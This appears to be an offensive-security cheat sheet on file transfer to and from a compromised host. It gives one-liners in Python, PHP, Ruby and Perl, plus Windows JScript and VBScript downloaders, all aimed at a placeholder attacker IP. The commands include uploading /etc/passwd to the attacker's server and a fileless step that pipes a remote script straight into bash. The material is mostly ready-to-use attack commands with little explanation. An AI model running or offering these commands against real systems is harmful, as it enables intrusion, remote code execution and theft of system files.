# Code Transfer
```table-of-contents
```
## Python
### Python 3 - Download
```shell
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://<ATTACKER_IP>/file", "file_saved")'
```
### Python 2 - Download (Legacy)
```shell
python2 -c 'import urllib;urllib.urlretrieve("http://<ATTACKER_IP>/file", "file_saved")'
```
### Python 3 - Upload (POST)
```shell
python3 -c 'import requests;requests.post("http://<ATTACKER_IP>:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
## PHP
### Download via `file_get_contents`
```shell
php -r '$file = file_get_contents("http://<ATTACKER_IP>/file"); file_put_contents("file_saved",$file);'
```
### Download via `fopen` (More robust)
```shell
php -r 'const BUFFER = 1024; $fremote = fopen("http://<ATTACKER_IP>/file", "rb"); $flocal = fopen("file_saved", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
### Fileless Execution (Pipe to Bash)
```shell
php -r '$lines = @file("http://<ATTACKER_IP>/script.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
## Ruby
### Download
```shell
ruby -e 'require "net/http"; File.write("file_saved", Net::HTTP.get(URI.parse("http://<ATTACKER_IP>/file")))'
```
## Perl
### Download
```shell
perl -e 'use LWP::Simple; getstore("http://<ATTACKER_IP>/file", "file_saved");'
```
## Windows Scripting (Legacy)
### JavaScript (`wget.js`)
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
**Execution:**
```shell
cscript.exe /nologo wget.js http://<ATTACKER_IP>/file.exe file.exe
```
### VBScript (`wget.vbs`)
```vb
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
**Execution:**
```shell
cscript.exe /nologo wget.vbs http://<ATTACKER_IP>/file.exe file.exe
```